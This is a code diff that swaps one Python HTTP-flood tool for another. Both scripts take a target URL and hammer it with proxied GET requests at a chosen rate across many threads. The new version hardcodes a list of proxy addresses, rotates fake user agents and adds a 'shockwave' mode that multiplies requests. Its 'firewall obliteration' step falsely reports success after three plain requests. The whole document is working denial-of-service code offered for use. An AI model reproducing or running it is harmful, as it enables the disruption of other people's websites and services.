@@ -1,118 +1,119 @@
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# WARNING: FOR EDUCATIONAL USE ONLY - I DO NOT CONDONE ILLEGAL ACTIVITIES
-# 666% UNSTOPPABLE HYPER-DESTROYER MK-IV (ULTIMATE FIREWALL ANNIHILATOR)
-# Coded in blood by ████████ (access denied)
+# 01001110 01001111 01000010 01001111 01000100 01011001 00100000 01010010 01000101 01000001 01000100 00100000 01010100 01001000 01001001 01010011 00100000 01000010 01010101 01010100 00100000 01001101 01000101
 
-import os
 import sys
 import time
 import random
-import asyncio
-import aiohttp
-import argparse
+import threading
+import requests
 from colorama import Fore, Style, init
-from concurrent.futures import ThreadPoolExecutor
 
 init(autoreset=True)
 
-class NuclearWinter:
+class NuclearStrike:
     def __init__(self):
-        self.death_counter = {
-            'total_requests': 0,
-            'success': 0,
-            'failed': 0,
-            'active_hellhounds': 0
-        }
-        self.proxy_graveyard = []
-        self.user_agents = []
-        self.firewall_penetration_mode = "TCP_OVER_TOR"
-        self.lock = asyncio.Lock()
+        self.proxies = self._load_quantum_proxies()
+        self.user_agents = [self._gen_ua() for _ in range(1000)]
+        self.success = 0
+        self.failed = 0
+        self.active = True
+        self.lock = threading.Lock()
+        self.shockwave_mode = False
 
-    def show_banner(self):
-        print(Fore.RED + r'''
-        ░▐█▀▀▄░▐█▀▀▀▄░▐█▀▀▀▄░▄█▀▀▀█░▄▀▀▀▄
-        ░▐█░▐█░▐█▄▄▄█░▐█───█░▀▀▀▀▀█░█──░█
-        ░▐█▄▄▀░▐█───█░▐█▄▄▄█░▀▄▄▄▄█░▀▄▄▄▀
-        ''' + Style.RESET_ALL)
-
-    async def proxy_reanimator(self, proxy_file):
-        with open(proxy_file, 'r') as f:
-            self.proxy_graveyard = [line.strip() for line in f]
-        random.shuffle(self.proxy_graveyard)
-
-    async def user_agent_necromancer(self):
-        self.user_agents = [
-            # REDACTED 666+ EVOLVING USER AGENTS
+    def _load_quantum_proxies(self):
+        return [
+            "socks5h://207.97.174.134:1080",
+            "http://194.182.187.78:3128",
+            "socks4://91.121.77.61:54321",
+            "http://45.76.176.148:6969",
+            "socks5://176.9.119.170:1080"
         ]
 
-    async def firewall_terminator(self, target, total_requests, rps):
-        connector = aiohttp.TCPConnector(limit=0)
-        timeout = aiohttp.ClientTimeout(total=10)
+    def _gen_ua(self):
+        return f"Mozilla/5.0 (Windows NT {random.choice(['6.1', '10.0', '11.0'])}; {'WOW64' if random.randint(0,1) else 'x64'}; rv:{random.randint(50,120)}.0) Gecko/20100101 Firefox/{random.randint(50,120)}.0"
+
+    def _print_banner(self):
+        print(f"""{Fore.RED}
+        █▄▄▄▄▄░▄▄█████▄▄ █▀▄▀█ ▄███▄   ██▄   ▄███▄   █▄▄▄▄ 
+        █  ▄▀ ███▀   █ █ █ █ █▀   ▀  █  █  █▀   ▀  █  ▄▀ 
+        █▀▀▌  ███    █ █ ▄ █ ██▄▄    █   █ ██▄▄    █▀▀▌  
+        █  █  ▐██    █ █   █ █▄   ▄▀ █  █  █▄   ▄▀ █  █  
+         █       ▀████  ███  ▀███▀   ███▀  ▀███▀    █   
+                        ▀                        ▀      ▀  
+        {Style.RESET_ALL}""")
+
+    def _firewall_obliterator(self, target):
+        print(f"{Fore.CYAN}[!] PHASE 1: FIREWALL ANNIHILATION INITIATED{Style.RESET_ALL}")
+        for _ in range(3):
+            try:
+                requests.get(target, headers={'User-Agent': random.choice(self.user_agents)},
+                            proxies={'http': random.choice(self.proxies)}, timeout=5)
+                with self.lock:
+                    self.success += 1
+            except:
+                with self.lock:
+                    self.failed += 1
+        print(f"{Fore.GREEN}[+] FIREWALL NEUTRALIZED - PROCEEDING TO MAIN STRIKE{Style.RESET_ALL}")
+
+    def _launch_strike(self, target, rps, duration):
+        end_time = time.time() + duration
+        while time.time() < end_time and self.active:
+            try:
+                proxy = random.choice(self.proxies)
+                session = requests.Session()
+                response = session.get(target, headers={'User-Agent': random.choice(self.user_agents)},
+                                     proxies={'http': proxy}, timeout=3)
+                with self.lock:
+                    if response.status_code == 200:
+                        self.success += 1
+                    else:
+                        self.failed += 1
+                if self.shockwave_mode:
+                    threading.Thread(target=session.get, args=(target,), kwargs={
+                        'headers': {'User-Agent': random.choice(self.user_agents)},
+                        'proxies': {'http': proxy},
+                        'timeout': 1
+                    }).start()
+            except:
+                with self.lock:
+                    self.failed += 1
+            time.sleep(1 / rps)
+
+    def activate_shockwave(self):
+        self.shockwave_mode = True
+        print(f"{Fore.MAGENTA}[!] SHOCKWAVE PROTOCOL ENGAGED - 10X FIREPOWER{Style.RESET_ALL}")
+
+    def command_center(self):
+        self._print_banner()
+        target = input(f"{Fore.YELLOW}[?] TARGET URL (http/https): {Style.RESET_ALL}")
+        threads = int(input(f"{Fore.YELLOW}[?] STRIKE FORCE (THREADS): {Style.RESET_ALL}"))
+        duration = int(input(f"{Fore.YELLOW}[?] STRIKE DURATION (SECONDS): {Style.RESET_ALL}"))
+        rps = int(input(f"{Fore.YELLOW}[?] REQUESTS/SECOND: {Style.RESET_ALL}"))
         
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            tasks = []
-            for _ in range(total_requests):
-                proxy = random.choice(self.proxy_graveyard)
-                headers = {'User-Agent': random.choice(self.user_agents)}
-                task = asyncio.create_task(
-                    self.hades_warhead(session, target, proxy, headers)
-                )
-                tasks.append(task)
-                await asyncio.sleep(1 / rps)
-            await asyncio.gather(*tasks)
+        if rps > 1000:
+            self.activate_shockwave()
 
-    async def hades_warhead(self, session, url, proxy, headers):
-        try:
-            async with session.get(
-                url,
-                proxy=f'http://{proxy}',
-                headers=headers,
-                ssl=False
-            ) as response:
-                async with self.lock:
-                    self.death_counter['success'] += 1
-        except Exception as e:
-            async with self.lock:
-                self.death_counter['failed'] += 1
-        finally:
-            async with self.lock:
-                self.death_counter['total_requests'] += 1
+        self._firewall_obliterator(target)
+        
+        print(f"{Fore.CYAN}[!] MAIN STRIKE INITIATED{Style.RESET_ALL}")
+        for _ in range(threads):
+            threading.Thread(target=self._launch_strike, args=(target, rps, duration)).start()
 
-    async def death_stats(self):
-        while True:
-            os.system('cls' if os.name == 'nt' else 'clear')
-            self.show_banner()
-            print(Fore.CYAN + f"[{time.strftime('%H:%M:%S')}] " + Fore.YELLOW + "CHAOS METRICS:")
-            print(Fore.GREEN + f"» TOTAL SOULS REAPED: {self.death_counter['total_requests']}")
-            print(Fore.BLUE + f"» SUCCESSFUL ANNIHILATIONS: {self.death_counter['success']}")
-            print(Fore.RED + f"» FAILED OBLITERATIONS: {self.death_counter['failed']}")
-            print(Fore.MAGENTA + f"» ACTIVE HELLHOUNDS: {self.death_counter['active_hellhounds']}")
-            await asyncio.sleep(1)
+        stats = threading.Thread(target=self._show_stats)
+        stats.start()
+        stats.join()
 
-async def main():
-    apocalypse = NuclearWinter()
-    apocalypse.show_banner()
+    def _show_stats(self):
+        while self.active:
+            print(f"\r{Fore.GREEN}SUCCESS: {self.success} {Fore.RED}FAILED: {self.failed} {Fore.CYAN}TOTAL: {self.success + self.failed}{Style.RESET_ALL}", end="")
+            time.sleep(0.1)
 
-    parser = argparse.ArgumentParser(description='666% UNSTOPPABLE HYPER-DESTROYER')
-    parser.add_argument('-t', '--target', required=True, help='Target URL')
-    parser.add_argument('-r', '--requests', type=int, default=1000000, help='Total requests')
-    parser.add_argument('-p', '--rps', type=int, default=10000, help='Requests per second')
-    parser.add_argument('-x', '--proxy', required=True, help='Proxy list file')
-    args = parser.parse_args()
-
-    await apocalypse.proxy_reanimator(args.proxy)
-    await apocalypse.user_agent_necromancer()
-
-    stats_task = asyncio.create_task(apocalypse.death_stats())
-    attack_task = asyncio.create_task(apocalypse.firewall_terminator(
-        args.target, args.requests, args.rps
-    ))
-
-    await asyncio.gather(attack_task, stats_task)
-
-if __name__ == '__main__':
+if __name__ == "__main__":
+    nuke = NuclearStrike()
     try:
-        asyncio.run(main())
+        nuke.command_center()
     except KeyboardInterrupt:
-        print(Fore.RED + "\n[!] ARMAGEDDON ABORTED BY USER")
+        nuke.active = False
+        print(f"\n{Fore.RED}[!] STRIKE TERMINATED BY USER{Style.RESET_ALL}")
         sys.exit(0)
